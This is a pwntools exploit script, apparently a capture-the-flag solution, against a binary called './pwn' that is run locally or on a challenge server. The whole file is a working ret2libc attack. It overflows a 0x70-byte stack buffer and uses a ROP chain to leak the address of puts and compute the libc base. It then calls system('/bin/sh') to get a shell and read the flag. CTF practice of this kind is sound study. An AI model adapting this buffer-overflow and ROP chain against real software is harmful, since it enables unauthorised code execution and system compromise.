from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("challenge.xinshi.fun", 49110)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]

"""
0x0000000000401176 : pop rdi ; ret
"""

pop_rdi = 0x0000000000401176
bss = 0x404040 + 0x800
main = 0x04011CF
ret = 0x000000000040101a 

payload = b"a" * 0x70
payload += p64(bss)
payload += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
payload += p64(main)

ddebug("break *0x04011F9 \n continue")
io.sendlineafter("name?\n", payload)

leak = u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.success("libc :-----> " + hex(libc.address))
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))


payload = b"a" * 0x70
payload += p64(bss)
payload += p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
io.sendlineafter("name?\n", payload)

io.sendline(b"cat flag")
io.interactive()
